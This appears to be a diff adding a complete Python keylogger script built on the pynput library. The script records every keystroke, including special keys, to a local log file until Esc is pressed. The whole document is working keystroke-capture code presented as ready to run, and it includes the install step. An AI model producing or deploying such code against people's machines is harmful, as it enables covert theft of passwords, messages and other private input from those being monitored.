@@ -1,0 +1,53 @@
+Install pynput library:
+pip install pynput
+python
+from pynput import keyboard
+
+# Path to the log file
+LOG_FILE = "key_log.txt"
+
+class KeyLogger:
+    def __init__(self):
+        self.log = ""
+
+    def on_press(self, key):
+        """Callback function that is called when a key is pressed."""
+        try:
+            # If the key is a character, append it to the log
+            self.log += key.char
+        except AttributeError:
+            # If the key is special (e.g., space, enter, etc.), record it differently
+            if key == keyboard.Key.space:
+                self.log += " "
+            elif key == keyboard.Key.enter:
+                self.log += "\n"
+            elif key == keyboard.Key.tab:
+                self.log += "\t"
+            else:
+                self.log += f" [{str(key)}] "
+
+        # Save to the log file after each key press
+        self.save_log()
+
+    def on_release(self, key):
+        """Callback function that is called when a key is released."""
+        if key == keyboard.Key.esc:
+            # Stop the listener when 'Esc' is pressed
+            return False
+
+    def save_log(self):
+        """Save the recorded keystrokes to a file."""
+        with open(LOG_FILE, "a") as f:
+            f.write(self.log)
+        self.log = ""  # Clear the log buffer after saving
+
+    def start(self):
+        """Start the keylogger."""
+        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
+            listener.join()
+
+# Example usage
+if __name__ == "__main__":
+    keylogger = KeyLogger()
+    print("Keylogger is running... Press 'Esc' to stop.")
+    keylogger.start()
